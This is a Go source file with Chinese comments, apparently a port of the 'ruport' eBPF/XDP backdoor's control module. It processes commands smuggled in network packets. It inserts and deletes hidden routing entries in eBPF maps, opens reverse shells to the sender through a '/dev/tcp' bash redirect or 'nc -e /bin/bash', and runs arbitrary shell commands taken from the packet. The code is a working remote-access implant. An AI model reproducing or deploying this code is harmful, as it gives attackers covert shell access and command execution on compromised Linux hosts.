//go:build linux

// control 实现原 ruport 项目 ruport.c 中 control_router/control_process 的
// 指令处理逻辑：路由增删、反弹连接（bash/nc）、执行 shell 命令。
package control

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"

	"github.com/cilium/ebpf"

	"ruport-go/internal/bpf"
	"ruport-go/internal/netnsx"
)

// procKey 对应原 FunctionNode 的 (cip, cport)，用于索引反弹子进程。
type procKey struct {
	cip   uint32
	cport uint16
}

// NetnsDisabled 禁用 netns 隐藏路由功能（ins=0x05，代码保留、功能停用）。
// 原因：宿主转发依赖 iptables FORWARD 放行（Docker 等环境默认 DROP）、
// 引入的系统状态面较大（netns/veth/ip_forward/路由），局限与风险偏高。
// 置为 false 可恢复启用（届时注意 FORWARD 链放行，见 doc/design/01）。
const NetnsDisabled = true

// Controller 保存功能子进程信息，等价于原项目的 FunctionNode 链表。
type Controller struct {
	cfg Config

	mu    sync.Mutex
	procs map[procKey]int

	// netns 隐藏路由（ins=0x05）的懒初始化状态与服务表
	nsMu     sync.Mutex
	ns       *netnsx.NS
	hostIP   uint32
	svcMu    sync.Mutex
	services map[string]*exec.Cmd
}

// Config 为 Controller 的初始化参数。
type Config struct {
	Ifindex     int           // 宿主出口网卡（取回包 SNAT 源 IP 用）
	NetnsName   string        // 默认 ruport_ns
	NetnsSubnet *net.IPNet    // 默认 10.0.0.0/24
	NetnsPrewarm *netnsx.NS  // 启动参数 -N 已预热的命名空间（可选，避免重复 Ensure）
}

func New(cfg Config) *Controller {
	if cfg.NetnsName == "" {
		cfg.NetnsName = "ruport_ns"
	}
	if cfg.NetnsSubnet == nil {
		// 默认 TEST-NET-1 保留段，真实网络不会路由该网段（netnsx 还会
		// 做冲突检测与备选回退）
		_, cfg.NetnsSubnet, _ = net.ParseCIDR("192.0.2.0/24")
	}
	return &Controller{
		cfg:      cfg,
		procs:    make(map[procKey]int),
		ns:       cfg.NetnsPrewarm,
		services: make(map[string]*exec.Cmd),
	}
}

// ntohs/ntohl 语义的字节序转换。
// map 中读出的 cip/cport 为网络字节序原始值（小端主机上读出的整型与其
// 内存字节相反），与内核侧保持同一份原始值作为 key，仅在展示/执行时转换。
func ip2str(ipv4 uint32) string {
	b := make(net.IP, 4)
	binary.LittleEndian.PutUint32(b, ipv4)
	return b.String()
}

func toHostPort(port uint16) uint16 {
	var b [2]byte
	binary.LittleEndian.PutUint16(b[:], port)
	return binary.BigEndian.Uint16(b[:])
}

// extString 取 ext 缓冲区中 NUL 结尾的字符串（对应原 strlen(msg->ext) 语义）。
func extString(ext []byte) string {
	for i, c := range ext {
		if c == 0 {
			return string(ext[:i])
		}
	}
	return string(ext)
}

// HandleRouter 根据消息操作路由表，等价于原 control_router()。
func (c *Controller) HandleRouter(msg *bpf.XdpMessage, routerMap *ebpf.Map) {
	hiByte := uint8(msg.Ins >> 8)
	loByte := uint8(msg.Ins)
	var router bpf.TcRouter

	key := uint64(msg.Cip)<<16 + uint64(msg.Cport)
	if hiByte > 0 { // 删除路由
		if err := routerMap.LookupAndDelete(key, &router); err == nil {
			log.Printf("delete a router: ip: %s, port: %d", ip2str(msg.Cip), toHostPort(router.Cport))
			// 清场语义：删除后若已无其他 netns 路由表项，连同服务与 ns 一并清理
			if !hasNetnsRoute(routerMap) {
				c.teardownNetns()
			}
		}
		return
	}

	// 添加路由：已存在则跳过（对应原 bpf_map_lookup_elem 命中返回）
	var exist bpf.TcRouter
	if err := routerMap.Lookup(key, &exist); err == nil {
		return
	}

	log.Printf("insert a router: ip: %s, port: %d", ip2str(msg.Cip), toHostPort(msg.Cport))

	switch loByte {
	case 0x01:
		// 原代码 case 0x01 中 nativeport 为 0 时 break，否则 fallthrough 执行插入
		if msg.Nativeport == 0 {
			log.Print("the nativeport is needed.")
			return
		}
		c.insertRouter(routerMap, key, msg, 0, 0)
	case 0x05:
		// netns 隐藏路由：懒初始化 ns 与服务，表项携带 ns 地址（nativeip/hostip）
		if NetnsDisabled {
			log.Print("netns route ignored: feature disabled")
			return
		}
		if msg.Nativeport == 0 {
			log.Print("the nativeport is needed.")
			return
		}
		nativeip, hostip, err := c.prepareNetnsRoute(extString(msg.Ext[:]))
		if err != nil {
			log.Printf("prepare netns route failed: %v", err)
			return
		}
		c.insertRouter(routerMap, key, msg, nativeip, hostip)
	case 0x02, 0x03:
		c.insertRouter(routerMap, key, msg, 0, 0)
	}
}

func (c *Controller) insertRouter(routerMap *ebpf.Map, key uint64, msg *bpf.XdpMessage, nativeip, hostip uint32) {
	router := bpf.TcRouter{
		Cip:        msg.Cip,
		Cport:      msg.Cport,
		Connport:   msg.Connport,
		Nativeport: msg.Nativeport,
		Nativeip:   nativeip,
		Hostip:     hostip,
	}
	if err := routerMap.Update(key, &router, ebpf.UpdateAny); err != nil {
		log.Printf("update router map failed: %v", err)
	}
}

// prepareNetnsRoute 处理 ins=0x05：按需建立 netns、按需拉起服务（同命令
// 去重复用），返回表项所需的 nativeip/hostip（网络序原始值）。
// ext 为空表示不拉服务（ns 里可能已有服务在跑，由调用方自行管理）。
func (c *Controller) prepareNetnsRoute(extCmd string) (uint32, uint32, error) {
	ns, err := c.ensureNetns()
	if err != nil {
		return 0, 0, err
	}
	if extCmd != "" {
		if err := c.ensureService(ns, extCmd); err != nil {
			return 0, 0, fmt.Errorf("start service %q: %w", extCmd, err)
		}
	}
	hostip, err := c.hostIPv4()
	if err != nil {
		return 0, 0, err
	}
	return binary.BigEndian.Uint32(ns.ServiceIP.To4()), hostip, nil
}

func (c *Controller) ensureNetns() (*netnsx.NS, error) {
	c.nsMu.Lock()
	defer c.nsMu.Unlock()
	if c.ns != nil {
		return c.ns, nil
	}
	ns, err := netnsx.Ensure(c.cfg.NetnsName, c.cfg.NetnsSubnet)
	if err != nil {
		return nil, err
	}
	c.ns = ns
	return ns, nil
}

// hostIPv4 取宿主出口网卡第一个 IPv4 地址（缓存一次）。
func (c *Controller) hostIPv4() (uint32, error) {
	c.nsMu.Lock()
	defer c.nsMu.Unlock()
	if c.hostIP != 0 {
		return c.hostIP, nil
	}
	iface, err := net.InterfaceByIndex(c.cfg.Ifindex)
	if err != nil {
		return 0, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return 0, err
	}
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok {
			if ip4 := ipn.IP.To4(); ip4 != nil && !ip4.IsLoopback() {
				c.hostIP = binary.BigEndian.Uint32(ip4)
				return c.hostIP, nil
			}
		}
	}
	return 0, fmt.Errorf("no IPv4 address on interface index %d", c.cfg.Ifindex)
}

// ensureService 在 ns 内拉起服务；同命令字符串只起一个进程（去重复用）。
func (c *Controller) ensureService(ns *netnsx.NS, cmdStr string) error {
	c.svcMu.Lock()
	defer c.svcMu.Unlock()
	if _, ok := c.services[cmdStr]; ok {
		return nil
	}
	cmd, err := netnsx.StartInNS(ns.Fd, strings.Fields(cmdStr))
	if err != nil {
		return err
	}
	c.services[cmdStr] = cmd
	log.Printf("service in netns: pid %d (%s)", cmd.Process.Pid, cmdStr)
	return nil
}

// Shutdown 完整清场：结束 ns 内所有服务、拆除 netns/veth、恢复 ip_forward。
// ruport 退出时调用；删除最后一条 netns 路由表项后也会触发。
func (c *Controller) Shutdown() {
	c.teardownNetns()
}

// teardownNetns 先结束服务（它们持有 ns），再拆除网络设施并重置懒初始化状态，
// 使下一条 05 指令可重新 Ensure。
func (c *Controller) teardownNetns() {
	c.svcMu.Lock()
	for cmdStr, p := range c.services {
		if p.Process != nil {
			_ = p.Process.Signal(syscall.SIGTERM)
		}
		delete(c.services, cmdStr)
	}
	c.svcMu.Unlock()

	c.nsMu.Lock()
	defer c.nsMu.Unlock()
	if c.ns == nil {
		return
	}
	if err := c.ns.Destroy(); err != nil {
		log.Printf("destroy netns: %v", err)
	}
	c.ns = nil
	log.Print("netns cleaned up")
}

// hasNetnsRoute 扫描路由表是否仍有 netns 表项（nativeip != 0）。
func hasNetnsRoute(routerMap *ebpf.Map) bool {
	var key uint64
	var r bpf.TcRouter
	iter := routerMap.Iterate()
	for iter.Next(&key, &r) {
		if r.Nativeip != 0 {
			return true
		}
	}
	return false
}

// HandleProcess 根据指令执行动作，等价于原 control_process()。
func (c *Controller) HandleProcess(msg *bpf.XdpMessage) {
	hiByte := uint8(msg.Ins >> 8)
	loByte := uint8(msg.Ins)

	// 获取当前路径
	cwd, err := os.Getwd()
	if err != nil {
		return
	}

	pname := extString(msg.Ext[:])
	destip := ip2str(msg.Cip)
	destport := strconv.Itoa(int(toHostPort(msg.Cport)))

	switch loByte {
	case 0x01: // 不处理，只是添加路由
	case 0x02: // 反弹
		// kill
		if hiByte > 0 {
			c.killChild(msg.Cip, msg.Cport)
			return
		}

		switch pname {
		case "bash":
			log.Print("-----------------bash------------------")

			cmd := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", destip, destport)
			log.Printf("cmd: %s", cmd)

			// fork + execl 后父进程不等待、不记录 pid（与原版一致）
			if err := exec.Command("/bin/sh", "-c", cmd).Start(); err != nil {
				log.Printf("start bash failed: %v", err)
			}
		case "nc":
			log.Print("-----------------nc------------------")
			// nc 必须在和程序同一个目录
			cmd := exec.Command(filepath.Join(cwd, "nc"), destip, destport, "-e", "/bin/bash")
			if err := cmd.Start(); err != nil {
				log.Printf("start nc failed: %v", err)
				return
			}
			// 把子进程的数据记录（对应原 FunctionNode 链表）
			c.addChild(procKey{msg.Cip, msg.Cport}, cmd.Process.Pid)
		default:
			// 原版：未知反弹类型直接失败
		}
	case 0x03: // 执行shell命令
		log.Print("-----------------execute shell------------------")
		if err := exec.Command("/bin/sh", "-c", extString(msg.Ext[:])).Start(); err != nil {
			log.Printf("execute shell failed: %v", err)
		}
	case 0x04: // 执行程序（原版未实现，保持为空）
	}
}

func (c *Controller) addChild(key procKey, pid int) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.procs[key] = pid
}

// killChild 查找并 kill 对应反弹子进程（SIGINT），等价于原
// deleteFunctionNode + kill 逻辑。
func (c *Controller) killChild(cip uint32, cport uint16) {
	key := procKey{cip, cport}

	c.mu.Lock()
	pid, ok := c.procs[key]
	if ok {
		delete(c.procs, key)
	}
	c.mu.Unlock()

	if ok && pid > 0 {
		if err := syscall.Kill(pid, syscall.SIGINT); err != nil {
			log.Printf("kill child %d failed: %v", pid, err)
		}
	}
}
